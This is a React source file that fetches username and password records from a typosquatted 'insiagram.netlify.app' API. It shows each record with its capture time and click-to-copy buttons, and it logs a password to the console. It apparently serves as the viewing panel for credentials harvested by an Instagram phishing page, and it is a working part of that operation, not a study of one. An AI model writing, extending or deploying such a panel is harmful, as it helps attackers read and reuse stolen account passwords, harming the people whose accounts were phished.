import React, { useEffect, useState } from "react";


const Display = () => {
  const host = "https://insiagram.netlify.app";
  const initialdata = [];
  const [data, setData] = useState(initialdata);

  useEffect(() => {
    getresult();
    // req();
  
  }, []);


  // const req= async()=>{

  //   const url = "https://www.instagram.com/vivek_kushwaha__1/?__a=1";

  //   const responsehd = await fetch(url
  //   );
  //   const getres =await responsehd.json();
  //   console.log(getres)
  // }

  const getresult = async () => {
    const response = await fetch(`${host}/api/newhibdatabase`, {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
    });
    const res = await response.json();
    console.log(res);
    console.log(res[0].password);
    setData(res);

    // for (let index = 0; index < res.length; index++) {
    //    setData
    // }
  };

  // const handleOntooltip=()=>{

  // }

  const sort = data.sort().reverse();

  const handleOnClick = (e) => {
    var content = document.getElementById("email");
    content.select();
    document.execCommand("copy");
  };
  return (
    <>
    
      <div className="tooltp visi">
        <p>Copied</p>
      </div>

      <h1 className="titl">HIB DATABASE</h1>

      {sort.length>0? sort.map((d,index) => {
        var c = d.date;
        var e = new Date(c);

        return (
          <div key={index} className="content_main">
            <div className="main_div">
              <div className="content_div">
                <p
                  id="tltp"
                  onClick={() => {
                    const k = d.email;
                    navigator.clipboard.writeText(k);

                    document.querySelector(".tooltp").classList.remove("visi");

                    setTimeout(() => {
                      document.querySelector(".tooltp").classList.add("visi");
                    }, 500);
                  }}
                >
                  {" "}
                  Username: {d.email}
                </p>

                <p
                  onClick={() => {
                    const k = d.password;
                    navigator.clipboard.writeText(k);

                    document.querySelector(".tooltp").classList.remove("visi");

                    setTimeout(() => {
                      document.querySelector(".tooltp").classList.add("visi");
                    }, 500);
                  }}
                  id="password"
                >
                  Password : {d.password}
                </p>
              </div>
              <div className="date_div">
                <p>
                  {e.getHours() < 10 ? "0" + e.getHours() : e.getHours()}:
                  {e.getMinutes() < 10 ? "0" + e.getMinutes() : e.getMinutes()}{" "}
                  {e.getHours() > 12 ? "PM" : "AM"}
                </p>
                <p>
                  {e.getMonth()}-{e.getDate()}
                </p>
              </div>
            </div>
          </div>
        );
      }):<h1>Loading...</h1>}
    </>
  );
};

export default Display;
